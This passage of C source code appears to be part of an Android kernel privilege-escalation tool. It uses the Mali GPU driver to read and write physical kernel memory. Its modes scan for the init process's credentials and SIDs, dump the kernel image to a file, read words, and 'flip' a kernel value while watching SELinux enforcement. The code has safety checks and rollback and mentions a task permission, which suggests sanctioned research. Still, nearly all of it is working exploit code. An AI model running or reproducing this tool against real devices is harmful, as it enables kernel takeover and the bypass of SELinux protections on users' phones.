	uint64_t img_pa, scan_end, range_start, range_end, pa;
	uint64_t pages, done = 0;
	int mali_fd, out_fd = -1, rc = 1;

	if (!v15_path_ok(path)) {
		printf("dump: path must be under /data/local/tmp/: %s\n",
		       path ? path : "(null)");
		return 2;
	}
	mali_fd = open_mali();
	if (mali_fd < 0)
		return 2;
	if (reader_init(r, mali_fd)) {
		printf("RESULT: dump reader bring-up failed\n");
		close(mali_fd);
		return 1;
	}
	img_pa = find_image_base(r, &scan_end);
	if (!img_pa || scan_end <= img_pa) {
		printf("RESULT: dump image base not found\n");
		close(mali_fd);
		return 1;
	}
	range_start = start_pa ? start_pa : img_pa;
	if (!length)
		length = scan_end - range_start;
	if (range_start < img_pa || range_start >= scan_end ||
	    (range_start & (PAGE_SIZE_ - 1)) || !length ||
	    length > scan_end - range_start) {
		printf("dump: bad range start=0x%llx length=%llu "
		       "image=0x%llx..0x%llx\n",
		       (unsigned long long)range_start,
		       (unsigned long long)length,
		       (unsigned long long)img_pa,
		       (unsigned long long)scan_end);
		close(mali_fd);
		return 2;
	}
	range_end = range_start + length;
	pages = (length + PAGE_SIZE_ - 1) / PAGE_SIZE_;
	printf("dump: path=%s image_pa=0x%llx image_end=0x%llx "
	       "range=0x%llx..0x%llx bytes=%llu pages=%llu pid=%d\n",
	       path, (unsigned long long)img_pa,
	       (unsigned long long)scan_end,
	       (unsigned long long)range_start,
	       (unsigned long long)range_end,
	       (unsigned long long)length, (unsigned long long)pages,
	       getpid());

	out_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC |
		      O_CLOEXEC | O_NOFOLLOW, 0600);
	if (out_fd < 0) {
		printf("dump: open %s errno=%d\n", path, errno);
		close(mali_fd);
		return 1;
	}
	brb_sha256_init(&sha);
	for (pa = range_start; pa < range_end; pa += PAGE_SIZE_) {
		size_t chunk = (size_t)(range_end - pa);
		int attempt = 0;

		if (chunk > PAGE_SIZE_)
			chunk = PAGE_SIZE_;
		while (rd_page(r, pa, page)) {
			if (++attempt >= 3) {
				printf("dump: read failed at pa=0x%llx "
				       "after %d attempts\n",
				       (unsigned long long)pa, attempt);
				goto out_fail;
			}
			printf("dump: retry pa=0x%llx attempt=%d\n",
			       (unsigned long long)pa, attempt);
			usleep(100000);
		}
		if (v15_write_full(out_fd, page, chunk)) {
			printf("dump: write failed at pa=0x%llx errno=%d\n",
			       (unsigned long long)pa, errno);
			goto out_fail;
		}
		brb_sha256_update(&sha, page, chunk);
		done++;
		if (done == 1 || done % 512 == 0 || done == pages)
			printf("dump: progress %llu/%llu (pa=0x%llx)\n",
			       (unsigned long long)done,
			       (unsigned long long)pages,
			       (unsigned long long)pa);
	}
	brb_sha256_final(&sha, digest);
	brb_sha256_hex(digest, hex);
	if (fchmod(out_fd, 0600))
		printf("dump: fchmod errno=%d (continuing)\n", errno);
	/* close() releases the descriptor even when it reports an error, so
	 * there is nothing to retry here - only to report. */
	if (close(out_fd)) {
		out_fd = -1;
		printf("dump: close errno=%d\n", errno);
		close(mali_fd);
		return 1;
	}
	out_fd = -1;
	close(mali_fd);
	printf("stats: cycles=%d windows=%d blocks=%d\n",
	       r->cycles, r->windows, r->blocks);
	printf("RESULT: DUMP OK path=%s start=0x%llx bytes=%llu sha256=%s\n",
	       path, (unsigned long long)range_start,
	       (unsigned long long)length, hex);
	return 0;

out_fail:
	if (out_fd >= 0)
		close(out_fd);
	close(mali_fd);
	unlink(path);
	printf("RESULT: DUMP FAILED (partial file removed)\n");
	return rc;
}

/* Read one 32-bit word through a fresh window.  No kernel writes. */
static int mode_read32(uint64_t pa)
{
	struct reader *r = &g_rd;
	uint8_t page[PAGE_SIZE_];
	uint32_t value;
	int fd;

	if ((pa & 3u) || pa >= ESC_RAM_SIZE) {
		printf("read: bad pa 0x%llx\n", (unsigned long long)pa);
		return 2;
	}
	fd = open_mali();
	if (fd < 0)
		return 2;
	if (reader_init(r, fd)) {
		printf("RESULT: read reader bring-up failed\n");
		close(fd);
		return 1;
	}
	if (rd_page(r, pa & ~(uint64_t)(PAGE_SIZE_ - 1), page)) {
		printf("read: read failed pa=0x%llx\n",
		       (unsigned long long)pa);
		close(fd);
		return 1;
	}
	memcpy(&value, page + (pa & (PAGE_SIZE_ - 1)), 4);
	printf("read: pa=0x%llx value=%u (0x%08x)\n",
	       (unsigned long long)pa, value, value);
	printf("RESULT: READ32 OK pa=0x%llx value=%u\n",
	       (unsigned long long)pa, value);
	close(fd);
	return 0;
}

/* One 32-bit store at pa, with before/after reads and rollback.  This is
 * the only mode that writes kernel data; run it as a separate process and
 * only with the write flag in the task permission. */
static int mode_flip(uint64_t pa, uint32_t old_value, uint32_t new_value)
{
	struct reader *r = &g_rd;
	uint8_t page[PAGE_SIZE_];
	uint32_t before = 0, after = 0, rollback = 0;
	uint32_t zero_off = 0;
	char enforce[32];
	int fd, er, ok = 0, after_ok = 0, rollback_ok = 0;

	if ((pa & 3u) || pa >= ESC_RAM_SIZE) {
		printf("flip: bad pa 0x%llx\n", (unsigned long long)pa);
		return 2;
	}
	fd = open_mali();
	if (fd < 0)
		return 2;
	if (reader_init(r, fd)) {
		printf("RESULT: flip reader bring-up failed\n");
		close(fd);
		return 1;
	}
	if (rd_page(r, pa & ~(uint64_t)(PAGE_SIZE_ - 1), page)) {
		printf("flip: before-read failed pa=0x%llx\n",
		       (unsigned long long)pa);
		close(fd);
		return 1;
	}
	memcpy(&before, page + (pa & (PAGE_SIZE_ - 1)), 4);
	er = v15_read_text("/sys/fs/selinux/enforce", enforce,
			   sizeof enforce);
	printf("flip: pa=0x%llx before=%u (want %u) enforce=%s\n",
	       (unsigned long long)pa, before, old_value,
	       er ? "unreadable" : enforce);
	if (before != old_value) {
		printf("RESULT: FLIP ABORT before mismatch (no write)\n");
		close(fd);
		return 1;
	}
	if (win_write32(r, pa, &new_value, &zero_off, 1)) {
		printf("flip: write failed errno=%d\n", errno);
		printf("RESULT: FLIP FAILED (no read-back)\n");
		close(fd);
		return 1;
	}
	usleep(100000);
	if (rd_page(r, pa & ~(uint64_t)(PAGE_SIZE_ - 1), page)) {
		printf("flip: after-read failed\n");
	} else {
		memcpy(&after, page + (pa & (PAGE_SIZE_ - 1)), 4);
		after_ok = 1;
	}
	er = v15_read_text("/sys/fs/selinux/enforce", enforce,
			   sizeof enforce);
	printf("flip: after=%s enforce=%s\n",
	       after_ok ? "read-ok" : "unreadable",
	       er ? "unreadable" : enforce);
	if (after_ok) {
		printf("flip: after-value=%u\n", after);
		if (after == new_value)
			ok = 1;
	}
	if (!ok) {
		printf("flip: read-back mismatch, rolling back to %u\n",
		       old_value);
		if (win_write32(r, pa, &old_value, &zero_off, 1)) {
			printf("flip: rollback write failed errno=%d\n", errno);
		} else if (!rd_page(r, pa & ~(uint64_t)(PAGE_SIZE_ - 1),
				    page)) {
			memcpy(&rollback, page + (pa & (PAGE_SIZE_ - 1)), 4);
			rollback_ok = 1;
			printf("flip: rollback read-back=%u\n", rollback);
		}
		close(fd);
		printf("RESULT: FLIP FAILED rollback=%s\n",
		       rollback_ok && rollback == old_value ? "OK" : "INCOMPLETE");
		return 1;
	}
	printf("stats: cycles=%d windows=%d blocks=%d\n",
	       r->cycles, r->windows, r->blocks);
	printf("RESULT: FLIP OK pa=0x%llx old=%u new=%u readback=%u "
	       "enforce=%s\n",
	       (unsigned long long)pa, old_value, new_value, after,
	       er ? "unreadable" : enforce);
	close(fd);
	return 0;
}

/* ---- modes ---- */

static int mode_scan(void)
{
	struct reader *r = &g_rd;
	struct esc_credview c;
	uint64_t init_pa, cred_pa, tss, kcap;
	uint32_t sid, ksid;
	int fd, rc;

	fd = open_mali();
	if (fd < 0)
		return 2;
	if (reader_init(r, fd)) {
		printf("RESULT: reader bring-up failed\n");
		return 1;
	}
	rc = run_scan(r, &init_pa, &cred_pa, &c, &tss, &sid, &kcap, &ksid);
	printf("stats: cycles=%d windows=%d blocks=%d\n",
	       r->cycles, r->windows, r->blocks);
	if (rc) {
		printf("RESULT: ESC-SCAN FAILED\n");
		return 1;
	}
	printf("RESULT: ESC-SCAN OK - init 0x%llx cred 0x%llx tss 0x%llx "
	       "sid=%u kcap=0x%llx ksid=%u\n",
	       (unsigned long long)init_pa, (unsigned long long)cred_pa,
	       (unsigned long long)tss, sid,
	       (unsigned long long)kcap, ksid);
	return 0;
}


int main(int argc, char **argv)
{
	struct sigaction sa;

	setbuf(stdout, NULL);
	if (argc < 2 ||
	    (argc != 2 && strcmp(argv[1], "dump") != 0 &&
	     strcmp(argv[1], "flip") != 0 &&
	     strcmp(argv[1], "read") != 0)) {
		fprintf(stderr,
			"usage: %s scan\n"
			"       %s dump [PATH [START LENGTH]]\n"
			"       %s read PA\n"
			"       %s flip PA OLD NEW\n",
			argv[0], argv[0], argv[0], argv[0]);
		return 2;
	}
	memset(&sa, 0, sizeof sa);
	sa.sa_sigaction = fault_handler;
	sa.sa_flags = SA_SIGINFO;
	sigaction(SIGBUS, &sa, NULL);
	sigaction(SIGSEGV, &sa, NULL);
	if (prctl(PR_SET_NAME, "esc36449") < 0)
		perror("prctl (continuing)");
	printf("escalate: pid=%d uid=%d comm set\n", getpid(), getuid());

	if (!strcmp(argv[1], "scan"))
		return mode_scan();
	if (!strcmp(argv[1], "dump")) {
		const char *path = argc >= 3 ? argv[2] : V15_DUMP_PATH;
		uint64_t start_pa = 0, length = 0;
		char *end = NULL;

		if (argc > 5) {
			fprintf(stderr, "dump: too many arguments\n");
			return 2;
		}
		if (argc >= 4) {
			errno = 0;
			start_pa = strtoull(argv[3], &end, 0);
			if (errno || !end || *end) {
				fprintf(stderr, "dump: bad START %s\n",
					argv[3]);
				return 2;
			}
		}
		if (argc >= 5) {
			errno = 0;
			length = strtoull(argv[4], &end, 0);
			if (errno || !end || *end) {
				fprintf(stderr, "dump: bad LENGTH %s\n",
					argv[4]);
				return 2;
			}
		}
		return mode_dump(path, start_pa, length);
	}
	if (!strcmp(argv[1], "read")) {
		char *end = NULL;
		unsigned long long pa;

		if (argc != 3) {
			fprintf(stderr, "read: need PA\n");
			return 2;
		}
		errno = 0;
		pa = strtoull(argv[2], &end, 0);
		if (errno || !end || *end) {
			fprintf(stderr, "read: bad PA %s\n", argv[2]);
			return 2;
		}
		return mode_read32((uint64_t)pa);
	}
	if (!strcmp(argv[1], "flip")) {
		char *end = NULL;
		unsigned long long pa, old_value, new_value;

		if (argc != 5) {
			fprintf(stderr, "flip: need PA OLD NEW\n");
			return 2;
		}
		errno = 0;
		pa = strtoull(argv[2], &end, 0);
		if (errno || !end || *end) {
			fprintf(stderr, "flip: bad PA %s\n", argv[2]);
			return 2;
		}
		errno = 0;
		old_value = strtoull(argv[3], &end, 0);
		if (errno || !end || *end || old_value > 0xffffffffULL) {
			fprintf(stderr, "flip: bad OLD %s\n", argv[3]);
			return 2;
		}
		errno = 0;
		new_value = strtoull(argv[4], &end, 0);
		if (errno || !end || *end || new_value > 0xffffffffULL) {
			fprintf(stderr, "flip: bad NEW %s\n", argv[4]);
			return 2;
		}
		return mode_flip((uint64_t)pa, (uint32_t)old_value,
				 (uint32_t)new_value);
	}
	fprintf(stderr, "unknown mode %s\n", argv[1]);
	return 2;
}
